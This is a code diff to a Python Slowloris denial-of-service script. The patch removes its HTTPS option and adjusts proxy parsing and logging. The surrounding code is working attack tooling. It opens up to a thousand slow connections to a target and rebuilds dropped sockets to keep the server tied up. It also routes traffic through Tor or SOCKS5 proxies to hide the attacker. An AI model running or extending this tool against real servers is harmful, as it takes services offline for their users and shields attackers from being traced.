@@ -3,18 +3,14 @@
 import click
 import socket
 import logging
-import ssl
 import time
 from random import randint, choice
 
 # Initializes a connection with specified options
-def init_connection(target, port, randomize, https, user_agents):
+def init_connection(target, port, randomize, user_agents):
     # Create the new socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(5)
-    # Wrap socket if https is required
-    if https:
-        sock = ssl.wrap_socket(sock)
     # Connect to target
     sock.connect((target, port))
     # Send request
@@ -35,12 +31,11 @@ def init_connection(target, port, randomize, https, user_agents):
 @click.option('--port', '-p', default=80, help="Port to attack on the remote target. Default is 80.")
 @click.option('--threads', '-t', default=1000, help="Number of connections to start with the remote target.")
 @click.option('--randomize', '-r', is_flag=True, help="Randomize user agents for every new socket.")
-@click.option('--https', '-s', is_flag=True, help="Enable SSL for the HTTP requests (enable HTTPS).")
 @click.option('--tor', '-T', is_flag=True, help="Open the connections the connections through the Tor network by using localhost:9050 as a SOCKS5 proxy. If you wish to use the Tor network through another host or port you must use the -x option.")
 @click.option('--proxy', '-x', help="Usage: -x proxy-host:proxy-port .Use a SOCKS5 proxy to communicate with the target.")
-@click.option('--quiet', '-q', help="Run the script in quiet mode removing all output.")
+@click.option('--quiet', '-q', is_flag=True, help="Run the script in quiet mode removing all output.")
 @click.argument('target', required=1)
-def attack(target, port, threads, randomize, https, tor, proxy, quiet):
+def attack(target, port, threads, randomize, tor, proxy, quiet):
     """A Slow Loris atack implementation in Python3 with support for ssl, proxies and the Tor network.\n
     You must have the click Python3 module which can be installed with pip:\n
         $ sudo pip3 install click\n
@@ -74,10 +69,10 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
         try:
             import socks
             proxy_host = proxy.split(':')[0]
-            proxy_port = int(proxy.split(':')[1])
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
+            proxy_port = proxy.split(':')[1]
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port))
             socket.socket = socks.socksocket
-            logging.info("SOCKS5 proxy enabled on "+proxy_host+":"+str(proxy_port))
+            logging.info("SOCKS5 proxy enabled on "+proxy_host+":"+proxy_port)
         except ImportError:
             logging.error("Socks proxy library not found...")
 
@@ -129,7 +124,7 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
     for i in range(threads):
         try:
             logging.debug("Creating socket number %s", i)
-            sock = init_connection(target, port, randomize, https, user_agents)
+            sock = init_connection(target, port, randomize, user_agents)
         except socket.error:
             break
         sockets.append(sock)
@@ -145,10 +140,10 @@ def attack(target, port, threads, randomize, https, tor, proxy, quiet):
                 sockets.remove(sock)
 
         # Recreate dead sockets
+        logging.debug("Recreating dead sockets...")
         for i in range(threads - len(sockets)):
-            logging.debug("Recreating dead sockets...")
             try:
-                sock = init_connection(target, port, randomize, https, user_agents)
+                sock = init_connection(target, port, randomize, user_agents)
                 if sock:
                     sockets.append(sock)
             except socket.error:
